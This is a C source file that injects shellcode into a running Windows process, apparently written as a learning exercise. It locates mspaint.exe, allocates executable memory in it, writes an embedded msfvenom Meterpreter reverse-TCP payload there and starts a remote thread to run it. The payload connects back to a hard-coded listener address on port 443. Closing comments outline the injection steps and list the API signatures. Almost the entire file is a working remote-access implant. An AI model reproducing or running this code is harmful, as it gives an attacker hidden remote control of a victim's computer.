//compile using 
// "clang++ -m64 -o shellcode.exe shellcode.c"

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define DECOR() printf("==================================================================\n")
#define INFO(MSG, ...) printf("[-_-] "  MSG  "\n", ##__VA_ARGS__)
#define GOOD(MSG, ...) printf("[^_^]"  MSG  "\n", ##__VA_ARGS__)
#define BAD(MSG, ...) printf("[>:(]"  MSG  "\n", ##__VA_ARGS__)
#define ERR(MSG, ...) {	DECOR();				          \
			fprintf(stderr,				      	          \
	      	      		"[EEK] "  MSG "\n"		       	  \
				"[EEK] ERROR CODE:      0x%ld\n"          \
				"[EEK] FUNCTION:        %s()\n" 	      \
				"[EEK] LINE: 	       %ld\n",            \
				GetLastError(),__func__,__LINE__);     	  \
				DECOR();			          			  \
		      }

DWORD getPID(_In_ const char* processName);
HANDLE inject(_In_ DWORD PID);
VOID CleanHandleWait(
		_In_ HANDLE hProcess,
		_In_ HANDLE hThread
		);

int main(void)
{
	DWORD PID = getPID("mspaint.exe");
	if(PID == -1)
	{
		return EXIT_FAILURE;
	}

	INFO("PID: %lu",PID);
	inject(PID);
	INFO("END");

	return EXIT_SUCCESS;
}

DWORD getPID(_In_ const char* processName)
{
	HANDLE hProcessSnap = NULL;	//list of processes
	PROCESSENTRY32 pe32;		//info of process
	
	hProcessSnap = CreateToolhelp32Snapshot(
			TH32CS_SNAPPROCESS, //snapshot Process flag
			0		   		    //Process ID
			);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		ERR("SNAPSHOT NOT FOUND");
		return -1;
	}

	GOOD("Took a snapshot...");

	pe32.dwSize = sizeof(PROCESSENTRY32);	//required for Process32 function

	if(Process32First(
		hProcessSnap, 			//list of processes
		&pe32	      			//change pe32 value
		))
	{
		do{
			if(strcmp(pe32.szExeFile, processName) == 0)
			{
				GOOD("FOUND PID FOR: %s", processName);
				CloseHandle(hProcessSnap);
				return pe32.th32ProcessID;
			}	
		}while(Process32Next(hProcessSnap, &pe32));
	}

	ERR("No PID found...");
	CloseHandle(hProcessSnap);
	return -1;
}

HANDLE inject(_In_ DWORD PID)
{

	//split into 2 lines (line1 + " " + line2)
	/**msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp 
	 * LHOST=192.168.198.128 LPORT=443 EXITFUNC=thread -f c --var-name=fortnite_beef */
unsigned char fortnite_beef[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
"\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\xc6\x80\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
"\x2a\x0a\x41\x89\xda\xff\xd5";

	HANDLE hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, 					//access flags
		FALSE, 									//handle inheritance
		PID										//DWORD Process ID
	);
	
	if(hProcess == INVALID_HANDLE_VALUE)
	{
		ERR("COULD NOT OPEN PROCESS");
		return NULL;
	}

	GOOD("PROCESS HAS BEEN OPENED");

	LPVOID lpBaseAddress = VirtualAllocEx(
		hProcess,								//process to allocate to
		NULL,									//starting address
		sizeof(fortnite_beef),					//size of memory region
		(MEM_COMMIT | MEM_RESERVE),				//allocation type flags
		PAGE_EXECUTE_READWRITE					//memory protection flags (suspicious)
	);


	if(lpBaseAddress == NULL)
	{
		ERR("COULD NOT ALLOCATE MEMORY");
		return NULL;
	}

	GOOD("MEMORY HAS BEEN ALLOCATED");

	BOOL isWritten = WriteProcessMemory(
		hProcess,							     //process to allocate to
		lpBaseAddress,						     //starting address
		fortnite_beef,						     //LPCVOID buffer (pointer  to a constant of any type)
		sizeof(fortnite_beef),				     //# of bytes to be written (in)
		NULL							         //# of bytes written	   (out)
	);
	
	if(!isWritten)
	{
		BAD("COULD NOT WRITE TO PROCESS MEMORY");
		return NULL;
	}

	GOOD("MEMORY HAS BEEN WRITTEN");	

	HANDLE	hThread = CreateRemoteThreadEx(
		hProcess,			 				   	 //process to create thread
		NULL,    								 //security attributes
		0,	 		       						 //dwStackSize (See Thread Stack Size on the MSDN for more information.)
		(LPTHREAD_START_ROUTINE)lpBaseAddress,	 //starting address from memory allocated
		NULL,									 //pointer to be passed through to the thread function (no need?)
		0,    									 //creation behavior flag
		NULL,									 //lpAttributeList (in)
		NULL									 //lpThreadId (out)
	);

	if(hThread == INVALID_HANDLE_VALUE)
	{
		ERR("COULD NOT CREATE THREAD");
		return NULL;
	}

	GOOD("THREAD CREATED");
	CleanHandleWait(hProcess,hThread);
}



VOID CleanHandleWait(HANDLE hProcess, HANDLE hThread){
	switch(WaitForSingleObject(hProcess,INFINITE)){
		case WAIT_OBJECT_0:
		INFO("Process is closing...");
			if(hProcess != NULL){CloseHandle(hProcess);}
			if(hThread != NULL){CloseHandle(hThread);}
		GOOD("HANDLES CLOSED");
		break;

		case WAIT_TIMEOUT:
		break;

		case WAIT_FAILED:
			if(hProcess != NULL){CloseHandle(hProcess);}
			if(hThread != NULL){CloseHandle(hThread);}
		ERR("PROCESS WAIT FAILED");
		break;

		default:
		ERR("UNKNOWN SIGNAL");
	}
}

/**
 * 
 * 
 *  Get a handle on a process by attaching to or creating one. 

	Allocate some memory in the process with the necessary/appropriate permissions for our shellcode to run.

	Write the contents of your shellcode/payload to that allocated page in the process memory.

	Create a thread that'll start running what you've surgically allocated and written into the process!

	Optional: Incorporate some cleanup and housekeeping once the thread's finished its execution.
 */
/** 
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);

BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);

HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
);
*/
